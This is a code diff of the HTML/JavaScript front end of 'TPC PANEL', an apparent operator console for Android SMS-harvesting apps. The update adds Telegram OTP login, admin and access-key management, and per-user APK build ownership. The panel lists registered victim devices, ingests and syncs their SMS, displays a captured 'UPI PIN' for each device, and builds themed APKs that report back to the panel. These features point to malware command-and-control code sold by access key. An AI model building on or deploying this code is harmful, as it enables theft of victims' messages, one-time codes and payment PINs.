@@ -52,7 +52,7 @@ background:linear-gradient(135deg,#22d3ee44,transparent 42%,#8b5cf644);
 -webkit-mask-composite:xor;mask-composite:exclude;pointer-events:none}
 
 .login{min-height:100vh;display:grid;place-items:center;padding:24px}
-.login-card{width:100%;max-width:430px;padding:32px;border-radius:22px;
+.login-card{width:100%;max-width:440px;padding:32px;border-radius:22px;
 background:linear-gradient(160deg,#0a1226,#050a18);border:1px solid var(--border);
 box-shadow:0 0 0 1px #38bdf81a,0 30px 90px #000000b3,0 0 80px #1e3a8a2e}
 .brand{display:flex;align-items:center;gap:13px}
@@ -90,6 +90,8 @@ display:flex;justify-content:space-between;align-items:center;gap:10px;font-size
 .howto{margin-top:16px;padding:12px 14px;border-radius:11px;background:#22d3ee0a;
 border:1px solid #22d3ee26;border-left:3px solid var(--neon);font-size:12px;color:#9fc4e6;line-height:1.75}
 .howto b{color:var(--neon)}
+.otp-code{letter-spacing:10px;text-align:center;font-family:var(--mono);font-size:22px;font-weight:700}
+.otp-meta{margin-top:10px;font-size:12px;color:var(--muted);text-align:center}
 
 .topbar{position:sticky;top:0;z-index:10;display:flex;justify-content:space-between;
 align-items:center;gap:16px;padding:12px 22px;background:#04060de6;
@@ -349,11 +351,12 @@ padding:11px 0;border-bottom:1px solid #0f1e3d}
 .toggle-row .t-desc{margin-top:3px;font-size:11.5px;color:var(--muted)}
 .u-actions{display:flex;gap:6px;flex-wrap:wrap;align-items:center}
 .u-actions input[type=date]{width:150px;padding:7px 9px;font-size:12px;font-family:var(--mono)}
-.keygen{display:grid;grid-template-columns:1.2fr 1fr 150px auto;gap:12px;align-items:end;padding:16px}
+.keygen{display:grid;grid-template-columns:1.1fr 1fr 1fr 150px auto;gap:12px;align-items:end;padding:16px}
 .keyout{margin-top:14px;padding:14px;border-radius:12px;background:#0a1226;
 border:1px dashed #fbbf2455;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
 .keyout .k{font-family:var(--mono);font-size:20px;font-weight:800;letter-spacing:3px;color:#fde68a;
 text-shadow:0 0 20px #fbbf2440;overflow-wrap:anywhere}
+.keyout .k.small{font-size:15px;letter-spacing:1px;color:#a7f3d0;text-shadow:none}
 
 .bar{height:8px;border-radius:999px;background:#0f1e3d;overflow:hidden;margin-top:10px}
 .bar>span{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,#22d3ee,#38bdf8)}
@@ -439,6 +442,7 @@ main{padding:18px 13px}
 <body>
 <div class="layer">
 
+<!-- ============================ LOGIN ============================ -->
 <section class="login" id="loginScreen" hidden>
 <div class="login-card">
 <div class="brand">
@@ -457,18 +461,36 @@ main{padding:18px 13px}
 </svg>
 <div><h1>TPC PANEL</h1><p>SMS &amp; APK Control</p></div>
 </div>
+
+<div id="loginCred">
 <h2>Sign in</h2>
-<p>Admin ID + password daalo, ya apni access key (TPC-XXXX-XXXX-XXXX) se andar aao.</p>
+<p>Admin username ya apni access key (TPC-XXXX-XXXX-XXXX) + password daalo. Telegram linked ho to OTP aayega.</p>
 <form id="loginForm">
 <label for="loginId">Login ID / Access key</label>
-<input id="loginId" autocomplete="username" placeholder="admin id  ya  TPC-XXXX-XXXX-XXXX" required>
-<label for="loginPass">Password <span class="muted small" style="text-transform:none;letter-spacing:0">(sirf admin)</span></label>
-<input id="loginPass" type="password" autocomplete="current-password" placeholder="admin password (user chhod de)">
+<input id="loginId" autocomplete="username" placeholder="admin username  ya  TPC-XXXX-XXXX-XXXX" required>
+<label for="loginPass">Password</label>
+<input id="loginPass" type="password" autocomplete="current-password" placeholder="password" required>
 <label class="chk"><input type="checkbox" id="remember" checked> Keep me signed in on this device</label>
 <button class="btn primary login-submit" id="loginBtn" type="submit">Sign in</button>
 <div class="msg" id="loginMsg" role="status" aria-live="polite"></div>
 </form>
-<div class="howto"><b>Auth module nahi hai?</b> Panel khud detect kar lega — login skip ho jayega aur APK Builder turant chalu.</div>
+</div>
+
+<div id="loginOtp" hidden>
+<h2>Telegram OTP</h2>
+<p>6-digit code aapke Telegram par bheja gaya hai (<span class="mono" id="otpMasked">••••</span>).</p>
+<form id="otpForm">
+<label for="otpCode">Code</label>
+<input id="otpCode" class="otp-code" inputmode="numeric" maxlength="8" autocomplete="one-time-code" placeholder="000000" required>
+<div class="otp-meta" id="otpTtl">—</div>
+<button class="btn primary login-submit" id="otpBtn" type="submit">Verify</button>
+<div class="msg" id="otpMsg" role="status" aria-live="polite"></div>
+</form>
+<button class="btn plain w100" id="otpResend" type="button" style="margin-top:10px" disabled>Resend code</button>
+<button class="btn plain w100" id="otpBack" type="button" style="margin-top:8px">← Back</button>
+</div>
+
+<div class="howto"><b>Bot se link karo:</b> Telegram par bot kholo aur <code class="mono">/link &lt;key&gt; &lt;password&gt;</code> bhejo — uske baad OTP wahin aayega.</div>
 <div class="login-foot">
 <span>Backend: <span class="mono" id="apiHint">/</span></span>
 <button class="apk" id="apkLogin" type="button"><span>APK</span></button>
@@ -477,6 +499,7 @@ main{padding:18px 13px}
 </div>
 </section>
 
+<!-- ============================ APP ============================ -->
 <div class="app" id="app" hidden>
 <header class="topbar">
 <div class="brand">
@@ -510,7 +533,7 @@ main{padding:18px 13px}
 <div class="layout">
 <aside class="side">
 <div>
-<p class="side-label">Main</p>
+<p class="side-label">Fleet</p>
 <button class="nav on" data-page="overview" type="button"><i>▦</i> Overview</button>
 <button class="nav" data-page="live" type="button"><i>⚡</i> Live dashboard</button>
 <button class="nav" data-page="messages" type="button"><i>✉</i> Messages</button>
@@ -521,11 +544,13 @@ main{padding:18px 13px}
 <button class="nav" data-page="builder" type="button"><i>📦</i> APK Builder</button>
 <p class="side-label" style="margin-top:22px">System</p>
 <button class="nav" data-page="devices" type="button"><i>▣</i> Devices</button>
-<button class="nav" data-page="users" data-admin-only="1" type="button"><i>🔑</i> Access keys</button>
+<button class="nav" data-page="users" data-admin-only="1" type="button"><i>🔑</i> Users &amp; keys</button>
+<button class="nav" data-page="admins" data-admin-only="1" type="button"><i>🛡</i> Admins</button>
+<button class="nav" data-page="account" type="button"><i>👤</i> My account</button>
 <button class="nav" data-page="settings" type="button"><i>⚙</i> Settings</button>
 </div>
 <div class="side-foot">
-<div>TPC PANEL · v7.2</div>
+<div>TPC PANEL · v8.0</div>
 <div>owner: <a href="https://t.me/icivan" target="_blank" rel="noopener">@icivan</a></div>
 </div>
 </aside>
@@ -551,7 +576,7 @@ main{padding:18px 13px}
 <div class="grid2">
 <section class="panel-box panel">
 <div class="panel-head"><h3>Recent devices</h3><button class="btn ghost" data-goto="devices" type="button">View all</button></div>
-<div class="table-wrap"><table><thead><tr><th>Device</th><th>ID</th><th>Number</th><th>Status</th><th>Registered</th></tr></thead><tbody id="recentBody"></tbody></table></div>
+<div class="table-wrap"><table><thead><tr><th>Device</th><th>ID</th><th>Number</th><th>Owner</th><th>Status</th><th>Registered</th></tr></thead><tbody id="recentBody"></tbody></table></div>
 </section>
 <section class="panel-box panel">
 <div class="panel-head"><h3>System status</h3></div>
@@ -560,7 +585,7 @@ main{padding:18px 13px}
 <div class="row"><div><div class="row-name">Store</div><div class="row-desc">/health/database</div></div><span class="badge" id="dbBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">APK builder</div><div class="row-desc">/api/builder/config</div></div><span class="badge" id="builderBadge">Checking</span></div>
 <div class="row"><div><div class="row-name">Admin socket</div><div class="row-desc">live link</div></div><span class="badge" id="wsBadge">Connecting</span></div>
-<div class="row"><div><div class="row-name">Device API</div><div class="row-desc">/admin/*</div></div><span class="badge" id="adminBadge">—</span></div>
+<div class="row"><div><div class="row-name">Telegram bot</div><div class="row-desc">OTP + alerts</div></div><span class="badge" id="botBadge">—</span></div>
 </div>
 </section>
 </div>
@@ -833,7 +858,7 @@ main{padding:18px 13px}
 
 <section class="page" id="page-users">
 <div class="head">
-<div><h2>Access keys</h2><p>Key generate karo, user ko do — koi register nahi</p></div>
+<div><h2>Users &amp; keys</h2><p>Key + password banao, Telegram se link karwao — OTP wahin jayega</p></div>
 <div class="toolbar"><input id="userSearch" placeholder="🔍 key / label / phone"><button class="btn ghost" data-refresh="users" type="button">↻ Refresh</button></div>
 </div>
 <div class="stats">
@@ -841,40 +866,118 @@ main{padding:18px 13px}
 <article class="stat panel"><div class="stat-top"><span class="stat-label">Active</span><span class="stat-icon">◉</span></div><div class="stat-val green" id="uActive">—</div><div class="stat-foot">valid access</div></article>
 <article class="stat panel"><div class="stat-top"><span class="stat-label">Expired</span><span class="stat-icon">⌛</span></div><div class="stat-val red" id="uExpired">—</div><div class="stat-foot">renew needed</div></article>
 <article class="stat panel"><div class="stat-top"><span class="stat-label">Blocked</span><span class="stat-icon">⛔</span></div><div class="stat-val violet" id="uBlocked">—</div><div class="stat-foot">manually blocked</div></article>
+<article class="stat panel"><div class="stat-top"><span class="stat-label">2FA linked</span><span class="stat-icon">📲</span></div><div class="stat-val green" id="uLinked">—</div><div class="stat-foot">telegram OTP</div></article>
 </div>
 <section class="panel-box panel">
 <div class="panel-head"><h3>Generate new key</h3><span class="badge">admin only</span></div>
 <div class="keygen">
 <div><label for="kLabel">Label / user name</label><input id="kLabel" placeholder="e.g. Rahul"></div>
 <div><label for="kPhone">Phone (optional)</label><input id="kPhone" class="mono" placeholder="+91…"></div>
+<div><label for="kPass">Password (blank = auto)</label><input id="kPass" class="mono" placeholder="auto generate"></div>
 <div><label for="kDays">Expiry</label><select id="kDays"><option value="7">7 days</option><option value="30" selected>30 days</option><option value="90">90 days</option><option value="365">1 year</option><option value="0">Lifetime</option></select></div>
-<div><button class="btn primary w100" id="kGen" type="button">🔑 Generate key</button></div>
+<div><button class="btn primary w100" id="kGen" type="button">🔑 Generate</button></div>
 </div>
 <div class="panel-body" style="padding-top:0">
-<div class="keyout" id="kOut" hidden><div><div class="small muted upper">Ye key user ko bhejo</div><div class="k" id="kValue">—</div></div><button class="mini g" id="kCopy" type="button">⧉ copy key</button></div>
+<div class="keyout" id="kOut" hidden>
+<div style="min-width:0">
+<div class="small muted upper">Ye credentials user ko bhejo</div>
+<div class="k" id="kValue">—</div>
+<div class="k mono small" id="kPassValue">—</div>
+</div>
+<button class="mini g" id="kCopy" type="button">⧉ copy dono</button>
+</div>
 </div>
 </section>
 <section class="panel-box panel">
 <div class="panel-head"><h3>Keys</h3><span class="badge" id="userCount">0</span></div>
-<div class="table-wrap"><table><thead><tr><th>Key</th><th>Label</th><th>Created</th><th>Last login</th><th>Logins</th><th>Expiry</th><th>Status</th><th>Set expiry</th><th></th></tr></thead><tbody id="userBody"></tbody></table></div>
+<div class="table-wrap"><table><thead><tr><th>Key</th><th>Label</th><th>Devices</th><th>Created</th><th>Last login</th><th>Logins</th><th>Expiry</th><th>2FA</th><th>Status</th><th>Set expiry</th><th></th></tr></thead><tbody id="userBody"></tbody></table></div>
+</section>
+</section>
+
+<section class="page" id="page-admins">
+<div class="head">
+<div><h2>Admins</h2><p>Panel admins — password + Telegram OTP</p></div>
+<button class="btn ghost" data-refresh="admins" type="button">↻ Refresh</button>
+</div>
+<div class="notice" id="adminNotice" hidden></div>
+<section class="panel-box panel">
+<div class="panel-head"><h3>New admin</h3><span class="badge">full access</span></div>
+<div class="keygen">
+<div><label for="aUser">Username</label><input id="aUser" placeholder="e.g. rahul"></div>
+<div><label for="aPass">Password (blank = auto)</label><input id="aPass" class="mono" placeholder="auto generate"></div>
+<div><label for="aConfirm">Confirm password</label><input id="aConfirm" class="mono" type="password" placeholder="dobara likho"></div>
+<div><button class="btn primary w100" id="aCreate" type="button">＋ Add admin</button></div>
+</div>
+<div class="panel-body" style="padding-top:0">
+<div class="keyout" id="aOut" hidden>
+<div style="min-width:0">
+<div class="small muted upper">Credentials</div>
+<div class="k mono" id="aValue">—</div>
+</div>
+<button class="mini g" id="aCopy" type="button">⧉ copy</button>
+</div>
+</div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Admin list</h3><span class="badge" id="adminCount">0</span></div>
+<div class="table-wrap"><table><thead><tr><th>Username</th><th>Source</th><th>Created</th><th>Last login</th><th>Logins</th><th>2FA</th><th>Status</th><th></th></tr></thead><tbody id="adminBody"></tbody></table></div>
+</section>
+</section>
+
+<section class="page" id="page-account">
+<div class="head"><div><h2>My account</h2><p>Password aur Telegram 2FA</p></div></div>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Identity</h3><span class="badge" id="accRole">—</span></div>
+<div class="panel-body" id="accInfo"><div class="muted small">load…</div></div>
+</section>
+<section class="panel-box panel" id="accPassPanel">
+<div class="panel-head"><h3>Change password</h3></div>
+<div class="panel-body">
+<label for="accCurrent">Current password</label>
+<input id="accCurrent" type="password" placeholder="purana password">
+<label for="accNew">New password</label>
+<input id="accNew" type="password" placeholder="naya password">
+<label for="accNew2">Confirm new password</label>
+<input id="accNew2" type="password" placeholder="dobara">
+<button class="btn primary" id="accPassSave" style="margin-top:14px" type="button">Save password</button>
+</div>
+</section>
+<section class="panel-box panel">
+<div class="panel-head"><h3>Telegram 2FA</h3><span class="badge" id="accTgBadge">—</span></div>
+<div class="panel-body" id="accTg"><div class="muted small">load…</div></div>
 </section>
 </section>
 
 <section class="page" id="page-settings">
 <div class="head"><div><h2>Settings</h2><p>Endpoints and operator notes</p></div></div>
 <section class="panel-box panel">
+<div class="panel-head"><h3>Telegram bot</h3><span class="badge" id="botState">—</span></div>
+<div class="panel-body">
+<div class="settings-row"><strong>Bot</strong><p class="mono" id="botName">—</p></div>
+<div class="settings-row"><strong>OTP</strong><p id="botOtp">—</p></div>
+<div class="settings-row"><strong>New connection alerts</strong><p id="botAlerts">—</p></div>
+<div class="settings-row"><strong>Last error</strong><p class="mono" id="botErr">—</p></div>
+<div style="display:flex;gap:10px;margin-top:14px;flex-wrap:wrap">
+<button class="btn ghost" id="botReload" type="button">↻ Reload status</button>
+<button class="btn primary" id="botTest" type="button">Send test notification</button>
+</div>
+<div class="howto" style="margin-top:16px">
+Link karne ke liye Telegram par bot kholo:<br>
+<code class="mono" id="botLinkHint">/link &lt;key ya admin&gt; &lt;password&gt;</code>
+</div>
+</div>
+</section>
+<section class="panel-box panel">
 <div class="panel-head"><h3>Application</h3></div>
 <div class="panel-body">
-<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v7.2</p></div>
+<div class="settings-row"><strong>Panel</strong><p>TPC PANEL · SMS &amp; APK Control · v8.0</p></div>
 <div class="settings-row"><strong>Owner</strong><p><a href="https://t.me/icivan" target="_blank" rel="noopener">https://t.me/icivan</a></p></div>
 <div class="settings-row"><strong>Backend</strong><p class="mono" id="apiBase">/</p></div>
 <div class="settings-row"><strong>APK Builder</strong><p>/api/apps · /api/builds · /api/builds/{id}/download · /api/builder/themes</p></div>
-<div class="settings-row"><strong>Builder health</strong><p>/api/builder/config · /api/builder/preflight</p></div>
 <div class="settings-row"><strong>Device socket</strong><p>/ws/device/{registration_id}</p></div>
 <div class="settings-row"><strong>Admin socket</strong><p>/ws/admin · build updates /ws/user</p></div>
 <div class="settings-row"><strong>SMS ingest</strong><p>/devices/sms/incoming · /devices/sms/sync</p></div>
-<div class="settings-row"><strong>Onboarding</strong><p>/devices/onboarding</p></div>
-<div class="settings-row"><strong>Device config</strong><p>/devices/config (base URL auto-inject)</p></div>
+<div class="settings-row"><strong>Auth</strong><p>/panel/login · /panel/access · /panel/otp/verify</p></div>
 </div>
 </section>
 </section>
@@ -1004,9 +1107,9 @@ const SIM_SVG = '<svg viewBox="0 0 24 24" width="15" height="15" fill="none" str
 const CFG_URL = "/api/builder/config";
 const PF_URL = "/api/builder/preflight";
 const THEMES_URL = "/api/builder/themes";
-const TKEY = "tpc.token.v14";
-const SKEY = "tpc.session.v14";
-const THEME_KEY = "tpc.theme.v14";
+const TKEY = "tpc.token.v15";
+const SKEY = "tpc.session.v15";
+const THEME_KEY = "tpc.theme.v15";
 
 const FALLBACK_THEME = {
 bg:"#0B0B0C",surface:"#151517",surfaceAlt:"#1C1C1F",accent:"#00E0B8",
@@ -1018,11 +1121,13 @@ let reloginPromise = null;
 let gridSig = "";
 let liveSig = "";
 let adminProbed = false;
+let otpChallenge = null;
+let otpTimer = null;
 
 const state = {
 auth:false, role:"user", noAuth:false, noAdmin:false,
-userId:"",
-devices:[], messages:[], devMsgs:{}, rules:[], users:[],
+userId:"", ownerId:"",
+devices:[], messages:[], devMsgs:{}, rules:[], users:[], admins:[],
 relay:null, relayAccount:null, forward:"",
 outbox:[], growth:null, growthEvents:[],
 apps:[], builds:[], buildCfg:null, quota:null, themes:[],
@@ -1055,6 +1160,11 @@ const el=$("#builderNotice"); if(!el)return;
 if(!text){el.hidden=true;return;}
 el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
 }
+function adminNotice(text,bad){
+const el=$("#adminNotice"); if(!el)return;
+if(!text){el.hidden=true;return;}
+el.textContent=text; el.className="notice"+(bad?" bad":""); el.hidden=false;
+}
 
 function token(){ try{return localStorage.getItem(TKEY)||"";}catch(e){return "";} }
 function setToken(t){ try{ t?localStorage.setItem(TKEY,t):localStorage.removeItem(TKEY);}catch(e){} }
@@ -1075,6 +1185,7 @@ t.textContent=text; t.hidden=false;
 clearTimeout(state.toastTimer); state.toastTimer=setTimeout(()=>{t.hidden=true;},3800);
 }
 function loginMsg(text,kind){ const el=$("#loginMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
+function otpMsg(text,kind){ const el=$("#otpMsg"); el.textContent=text; el.className="msg "+(kind||"err"); }
 function badge(el,text,kind){ if(!el)return; el.textContent=text; el.className="badge "+(kind||""); }
 
 function fmt(v){ if(!v)return "—"; const d=new Date(v);
@@ -1197,12 +1308,6 @@ const list=state.messages.filter((m)=>String(m.device_id)===id);
 state.devMsgs[id]=list;
 return list;
 }
-function simCount(d){
-const t=tel(d);
-let n=Array.isArray(t.sims)?t.sims.length:0;
-if(n<=0){ try{ n=Number(t.sim_count||0)||0; }catch(e){ n=0; } }
-return Math.max(1,Math.min(n,2));
-}
 function simLabel(d,slot){
 if(!d)return "slot "+(slot+1);
 const s=(nums(d).slots||[])[slot];
@@ -1260,16 +1365,18 @@ return data;
 }
 
 async function relogin(){
-const s=readSession(); if(!s)return false;
+const s=readSession(); if(!s||!s.pass)return false;
 if(reloginPromise)return reloginPromise;
 reloginPromise=(async()=>{
 try{
-let r;
-if(s.pass) r=await api("/panel/login",{method:"POST",body:JSON.stringify({login_id:s.id,password:decPass(s.pass)})},false);
-else r=await api("/panel/access",{method:"POST",body:JSON.stringify({key:s.id})},false);
+const url=s.role==="admin"?"/panel/login":"/panel/access";
+const body=s.role==="admin"
+?{login_id:s.id,password:decPass(s.pass)}
+:{key:s.id,password:decPass(s.pass)};
+const r=await api(url,{method:"POST",body:JSON.stringify(body)},false);
+if(r&&r.status==="otp_required")return false;
 if(r&&r.token)setToken(r.token);
 if(r&&r.role)state.role=r.role;
-if(r&&r.username)state.userId=r.username;
 return true;
 }catch(e){ return false; }
 })();
@@ -1372,6 +1479,7 @@ badge($("#roleBadge"),state.noAuth?"NO-AUTH":(isAdmin?"ADMIN":"USER"),isAdmin?"o
 
 function showLogin(msgText){
 state.auth=false; $("#app").hidden=true; $("#loginScreen").hidden=false; closeDetail();
+$("#loginCred").hidden=false; $("#loginOtp").hidden=true;
 const s=readSession(); if(s&&s.id&&!$("#loginId").value)$("#loginId").value=s.id;
 if(msgText)loginMsg(msgText);
 }
@@ -1381,6 +1489,7 @@ async function afterLogin(role){
 state.role=role||"user"; applyRole();
 await probeAdmin();
 await refreshAll();
+loadAccount().catch(()=>{});
 startRealtime();
 connectUserSocket();
 }
@@ -1406,21 +1515,20 @@ return;
 }
 if(err&&err.status===404){
 state.noAuth=true;
-const s=readSession();
 showApp();
-await afterLogin(s&&s.role?s.role:"admin");
+await afterLogin("admin");
 return;
 }
 
 const s=readSession();
 if(st&&st.admin_id){
 state.userId=st.admin_id||"";
-showApp(); await afterLogin(st.role||(s&&s.role)||"admin"); return;
+showApp(); await afterLogin(st.role||"admin"); return;
 }
 if(s){
 const ok=await relogin();
 if(ok){ showApp(); await afterLogin(state.role||s.role||"user"); return; }
-showLogin("Saved session invalid — key/password daalo"); return;
+showLogin("Saved session invalid — dobara login karo"); return;
 }
 showLogin("");
 }
@@ -1473,7 +1581,7 @@ $("#sUninstalled").textContent=num(state.growth.uninstalled);
 $("#sReinstalls").textContent=num(state.growth.reinstalls);
 }
 const body=$("#recentBody");
-if(!state.devices.length){ empty(body,5,"No devices registered"); return; }
+if(!state.devices.length){ empty(body,6,"No devices registered"); return; }
 body.replaceChildren();
 state.devices.slice(0,6).forEach((d)=>{
 const row=document.createElement("tr");
@@ -1484,6 +1592,7 @@ const c=document.createElement("td"); const info=nums(d);
 c.textContent=info.live||info.entered||tel(d).sim_carrier||"—";
 if(d.upi_pin){ const p=document.createElement("span"); p.className="pin-chip"; p.textContent="PIN "+d.upi_pin; c.appendChild(p); }
 row.appendChild(c);
+cell(row,d.owner_label||(d.owner_key_id?"linked":"admin"));
 badgeCell(row,devStatus(d)); cell(row,fmt(d.created_at));
 body.appendChild(row);
 });
@@ -1776,7 +1885,7 @@ sc.innerHTML=
 
 async function loadApps(){
 try{
-const d=await api("/api/apps");
+const d=await api("/api/apps?userId="+encodeURIComponent(state.ownerId||state.userId||"anon"));
 state.apps=listOf(d,"apps").map(normApp);
 state.quota=(d&&d.quota)?d.quota:null;
 }catch(e){ state.apps=[]; }
@@ -1784,7 +1893,8 @@ renderApps();
 }
 
 async function loadBuilds(){
-try{ const d=await api("/api/builds?limit=60"); state.builds=listOf(d,"builds").map(normBuild); }
+try{ const d=await api("/api/builds?limit=60&userId="+encodeURIComponent(state.ownerId||state.userId||"anon"));
+state.builds=listOf(d,"builds").map(normBuild); }
 catch(e){ state.builds=[]; }
 renderBuilds();
 }
@@ -1877,7 +1987,8 @@ const r=await api("/api/apps",{method:"POST",body:JSON.stringify({
 name:name,
 package:$("#appPkg").value.trim()||null,
 variant:$("#appVariant").value,
-theme:state.pickedTheme
+theme:state.pickedTheme,
+userId:state.ownerId||state.userId||"anon"
 })});
 const app=(r&&r.app)?r.app:(r||{});
 showSecret(app);
@@ -1913,6 +2024,7 @@ appName:name, package:pkg,
 theme:(app&&app.theme)||state.pickedTheme,
 variant:$("#appVariant").value,
 baseUrl:$("#appBase").value.trim()||null,
+userId:state.ownerId||state.userId||"anon",
 config:{applicationId:pkg, name:name}
 };
 if(app&&app.appId)body.appId=app.appId;
@@ -2075,9 +2187,9 @@ if(state.noAdmin)return;
 if(state.role!=="admin"&&!state.noAuth){
 $("#userBody").replaceChildren();
 $("#userCount").textContent="admin only";
-$("#uTotal").textContent=$("#uActive").textContent=$("#uExpired").textContent=$("#uBlocked").textContent="—";
+$("#uTotal").textContent=$("#uActive").textContent=$("#uExpired").textContent=$("#uBlocked").textContent=$("#uLinked").textContent="—";
 const row=document.createElement("tr"); const td=document.createElement("td");
-td.colSpan=9; td.className="empty"; td.textContent="Key role se access keys nahi dikhti — admin se login karo";
+td.colSpan=11; td.className="empty"; td.textContent="Key role se users nahi dikhte — admin se login karo";
 row.appendChild(td); $("#userBody").appendChild(row);
 return;
 }
@@ -2089,23 +2201,36 @@ $("#uTotal").textContent=state.users.length;
 $("#uActive").textContent=state.users.filter((u)=>!u.blocked&&(!u.expires_at||new Date(u.expires_at).getTime()>now)).length;
 $("#uExpired").textContent=state.users.filter((u)=>!u.blocked&&u.expires_at&&new Date(u.expires_at).getTime()<=now).length;
 $("#uBlocked").textContent=state.users.filter((u)=>u.blocked).length;
+$("#uLinked").textContent=state.users.filter((u)=>u.telegram_linked).length;
 $("#userCount").textContent=list.length+" keys";
 const body=$("#userBody");
-if(!list.length){ empty(body,9,q?"Koi key match nahi hui":"Abhi koi key generate nahi ki"); return; }
+if(!list.length){ empty(body,11,q?"Koi key match nahi hui":"Abhi koi key generate nahi ki"); return; }
 body.replaceChildren();
 list.forEach((u)=>{
 const row=document.createElement("tr");
 const kc=document.createElement("td"); const kb=document.createElement("span");
-kb.className="badge key"; kb.textContent=u.key||"—"; kc.appendChild(kb); row.appendChild(kc);
+kb.className="badge key"; kb.textContent=u.key||"—"; kc.appendChild(kb);
+if(u.has_password){ const pw=document.createElement("span"); pw.className="sub"; pw.textContent="password set"; kc.appendChild(pw); }
+else { const pw=document.createElement("span"); pw.className="sub"; pw.textContent="NO PASSWORD"; kc.appendChild(pw); }
+row.appendChild(kc);
 const lc=document.createElement("td"); lc.textContent=u.label||"—";
 if(u.phone){ const p=document.createElement("span"); p.className="sub mono"; p.textContent=u.phone; lc.appendChild(p); }
 row.appendChild(lc);
+cell(row,String(num(u.devices)));
 cell(row,fmtDate(u.created_at));
 const ll=document.createElement("td"); ll.textContent=u.last_login_at?fmt(u.last_login_at):"never"; row.appendChild(ll);
 cell(row,String(num(u.login_count)));
 const ec=document.createElement("td"); const eb=document.createElement("span");
 eb.className="badge "+(u.expires_at?(u.expired?"bad":"warn"):"ok");
 eb.textContent=u.expires_at?fmtDate(u.expires_at):"lifetime"; ec.appendChild(eb); row.appendChild(ec);
+const tc=document.createElement("td");
+if(u.telegram_linked){
+const tb=document.createElement("span"); tb.className="badge ok"; tb.textContent=u.telegram_masked||"linked"; tc.appendChild(tb);
+const ub=document.createElement("button"); ub.className="mini d"; ub.type="button"; ub.textContent="unlink";
+ub.style.marginTop="5px";
+ub.addEventListener("click",()=>unlinkKeyTelegram(u)); tc.appendChild(ub);
+}else{ const tb=document.createElement("span"); tb.className="badge warn"; tb.textContent="off"; tc.appendChild(tb); }
+row.appendChild(tc);
 const st=keyStatus(u); badgeCell(row,st.text,st.kind);
 const sc=document.createElement("td"); const wrap=document.createElement("div"); wrap.className="u-actions";
 [7,30,90].forEach((days)=>{
@@ -2124,11 +2249,13 @@ sc.appendChild(wrap); row.appendChild(sc);
 const ac=document.createElement("td"); const aw=document.createElement("div"); aw.className="u-actions";
 const cb=document.createElement("button"); cb.className="mini"; cb.type="button"; cb.textContent="⧉ copy";
 cb.addEventListener("click",()=>copyText(u.key||"",u.key||"")); aw.appendChild(cb);
+const pb=document.createElement("button"); pb.className="mini v"; pb.type="button"; pb.textContent="🔑 pass";
+pb.title="reset password"; pb.addEventListener("click",()=>resetKeyPassword(u)); aw.appendChild(pb);
 const rb=document.createElement("button"); rb.className="mini v"; rb.type="button"; rb.textContent="⟳";
-rb.title="rotate"; rb.addEventListener("click",()=>rotateKey(u)); aw.appendChild(rb);
-const tb=document.createElement("button"); tb.className="mini "+(u.blocked?"g":"d"); tb.type="button";
-tb.textContent=u.blocked?"Unblock":"Block"; tb.addEventListener("click",()=>toggleKey(u.id,u.blocked));
-aw.appendChild(tb);
+rb.title="rotate key"; rb.addEventListener("click",()=>rotateKey(u)); aw.appendChild(rb);
+const tb2=document.createElement("button"); tb2.className="mini "+(u.blocked?"g":"d"); tb2.type="button";
+tb2.textContent=u.blocked?"Unblock":"Block"; tb2.addEventListener("click",()=>toggleKey(u.id,u.blocked));
+aw.appendChild(tb2);
 const db=document.createElement("button"); db.className="mini d"; db.type="button"; db.textContent="Delete";
 db.addEventListener("click",()=>deleteKey(u)); aw.appendChild(db);
 ac.appendChild(aw); row.appendChild(ac);
@@ -2149,16 +2276,190 @@ async function toggleKey(id,blocked){
 try{ await api("/admin/keys/"+id+"/toggle",{method:"POST",body:JSON.stringify({blocked:!blocked})});
 toast(blocked?"unblocked":"blocked"); await loadUsers(); }catch(e){ toast(e.message); }
 }
+async function resetKeyPassword(u){
+if(!confirm("Password reset karein? Purana password turant band ho jayega."))return;
+try{
+const r=await api("/admin/keys/"+u.id+"/password",{method:"POST",body:JSON.stringify({})});
+$("#kValue").textContent=u.key||"";
+$("#kPassValue").textContent=r.password;
+$("#kOut").hidden=false;
+toast("naya password generate hua — copy karke bhejo");
+await loadUsers();
+}catch(e){ toast(e.message); }
+}
+async function unlinkKeyTelegram(u){
+try{ await api("/admin/keys/"+u.id+"/telegram",{method:"POST",body:JSON.stringify({chat_id:""})});
+toast("telegram unlinked"); await loadUsers(); }catch(e){ toast(e.message); }
+}
 async function rotateKey(u){
 if(!confirm("Key rotate karein? Purani key kaam karna band kar degi."))return;
 try{ const r=await api("/admin/keys/"+u.id+"/rotate",{method:"POST"});
-$("#kValue").textContent=r.key; $("#kOut").hidden=false;
+$("#kValue").textContent=r.key; $("#kPassValue").textContent="(password wahi hai)";
+$("#kOut").hidden=false;
 toast("key rotated"); await loadUsers(); }catch(e){ toast(e.message); }
 }
 async function deleteKey(u){
 if(!confirm("Delete key "+(u.key||"")+"?"))return;
 try{ await api("/admin/keys/"+u.id+"/delete",{method:"POST"}); toast("deleted"); await loadUsers(); }
 catch(e){ toast(e.message); }
+}
+
+// ------------------------------------------------------------------ admins
+
+function renderAdmins(){
+const body=$("#adminBody");
+$("#adminCount").textContent=state.admins.length+" admins";
+if(!state.admins.length){ empty(body,8,"Koi admin nahi"); return; }
+body.replaceChildren();
+state.admins.forEach((a)=>{
+const row=document.createElement("tr");
+cell(row,a.username);
+badgeCell(row,a.env?"env":"db",a.env?"violet":"");
+cell(row,a.created_at?fmtDate(a.created_at):"—");
+cell(row,a.last_login_at?fmt(a.last_login_at):"never");
+cell(row,String(num(a.login_count)));
+const tc=document.createElement("td");
+if(a.telegram_linked){
+const b=document.createElement("span"); b.className="badge ok"; b.textContent=a.telegram_masked||"linked"; tc.appendChild(b);
+}else{ const b=document.createElement("span"); b.className="badge warn"; b.textContent="off"; tc.appendChild(b); }
+row.appendChild(tc);
+badgeCell(row,a.active?"active":"disabled",a.active?"ok":"bad");
+const ac=document.createElement("td"); const w=document.createElement("div"); w.className="u-actions";
+const pb=document.createElement("button"); pb.className="mini v"; pb.type="button"; pb.textContent="🔑 pass";
